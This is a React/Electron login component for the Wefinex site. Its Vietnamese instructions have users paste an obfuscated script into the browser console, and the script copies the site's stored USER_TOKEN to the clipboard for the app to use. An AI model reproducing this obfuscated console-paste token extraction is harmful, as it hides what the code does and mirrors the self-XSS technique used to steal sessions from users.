import React, { useEffect } from 'react';
import PropTypes from 'prop-types';
import { Button, Card, notification } from 'antd';
import { useDispatch, useSelector } from 'react-redux';

import { loginWefinex } from '../../actions/app';

const { clipboard } = require('electron');

const scriptCopyWefinexToken = `var _0x3885=['value','4129266NEtfdu','102FLreYF','775456FMlDzG','getItem','execCommand','341926IDmgBo','body','95ZiKvPx','627282NApDNS','select','USER_TOKEN','3367KkxUWU','295361vfairn','17090aBLxpi','removeChild','appendChild','2yqgICz','4qOwIjC','2OdsLqF'];var _0x4235=function(_0x447544,_0x25344f){_0x447544=_0x447544-0x142;var _0x388514=_0x3885[_0x447544];return _0x388514;};var _0x394657=_0x4235;(function(_0x576c79,_0x347eb6){var _0x3146e0=_0x4235;while(!![]){try{var _0x41b05f=parseInt(_0x3146e0(0x145))*-parseInt(_0x3146e0(0x14f))+-parseInt(_0x3146e0(0x154))*parseInt(_0x3146e0(0x14c))+-parseInt(_0x3146e0(0x142))*parseInt(_0x3146e0(0x150))+-parseInt(_0x3146e0(0x155))*-parseInt(_0x3146e0(0x149))+parseInt(_0x3146e0(0x151))*-parseInt(_0x3146e0(0x14b))+-parseInt(_0x3146e0(0x146))+parseInt(_0x3146e0(0x144));if(_0x41b05f===_0x347eb6)break;else _0x576c79['push'](_0x576c79['shift']());}catch(_0x4e6b54){_0x576c79['push'](_0x576c79['shift']());}}}(_0x3885,0xddfbc));var dummy=document['createElement']('textarea');document[_0x394657(0x14a)][_0x394657(0x153)](dummy),dummy[_0x394657(0x143)]=localStorage[_0x394657(0x147)](_0x394657(0x14e)),dummy[_0x394657(0x14d)](),document[_0x394657(0x148)]('copy'),document[_0x394657(0x14a)][_0x394657(0x152)](dummy);`;

function LoginWefinex(props) {
  const dispatch = useDispatch();
  const { loading } = useSelector((state) => state.app);

  const login = async (jsonToken) => {
    try {
      const token = JSON.parse(jsonToken);
      if (token.access_token && token.refresh_token) {
        dispatch(loginWefinex(token));
      } else {
        notification.error({
          message: 'Lỗi!',
          description: 'Đã có lỗi xảy ra. Vui lòng thực hiện đúng các bước!',
        });
      }
    } catch (error) {
      notification.error({
        message: 'Lỗi!',
        description: 'Đã có lỗi xảy ra. Vui lòng thực hiện đúng các bước!',
      });
    }
  };

  useEffect(() => {
    dispatch(loginWefinex({}));
  }, []);

  return (
    <>
      <Card
        title="Đăng nhập Wefinex"
        bordered={false}
        style={{ margin: '-24px' }}
      >
        <p>
          <b>Bước 1: </b>
          Bấm nút copy bên dưới
        </p>
        <Button
          type="primary"
          onClick={() => {
            clipboard.writeText(scriptCopyWefinexToken);
          }}
          style={{ marginBottom: '1em' }}
        >
          Copy script
        </Button>
        {/* <TextArea
          rows={8}
          value={scriptCopyWefinexToken}
          style={{ marginBottom: '1em' }}
        /> */}
        <p>
          <b>Bước 2: </b>
          Truy cập{' '}
          <a
            onClick={() => {
              window.open(
                'https://wefinex.net/login',
                '_blank',
                'nodeIntegration=no'
              );
            }}
          >
            https://wefinex.net/login{' '}
          </a>
          và đăng nhập
        </p>

        <p>
          <b>Bước 3: </b>
          Sau khi đăng nhập bấm phím <b>F12</b> và chọn tab <b>Console</b> sau
          đó paste mã đã copy và bấm <b>Enter</b>
        </p>
        <p>
          <b>Bước 4: </b>
          Bấm nút đăng nhập bên dưới
        </p>
        <Button
          type="primary"
          onClick={() => {
            const jsonToken = clipboard.readText();
            login(jsonToken);
          }}
          loading={loading}
        >
          Đăng nhập
        </Button>
      </Card>
    </>
  );
}

LoginWefinex.propTypes = {};

export default LoginWefinex;
